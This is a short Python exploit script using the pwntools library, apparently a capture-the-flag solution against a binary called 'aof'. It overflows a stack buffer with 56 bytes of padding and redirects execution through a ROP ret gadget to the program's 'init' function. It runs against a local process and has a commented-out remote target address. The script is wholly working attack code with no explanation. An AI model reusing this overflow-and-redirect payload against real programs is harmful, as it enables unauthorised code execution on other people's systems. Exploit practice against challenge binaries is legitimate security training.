from pwn import *
import sys
import re

bin = "./aof"
elf = context.binary = ELF(bin)
rop = ROP(elf)
io = elf.process()
#io = remote("143.198.227.172", 32785)
payload = flat(
	[
	b"A" * 56,
	rop.ret.address,
	elf.sym.init,
	]
)

print(payload)

io.sendline(payload)

recvd = io.recvall()

print(recvd)

io.close()

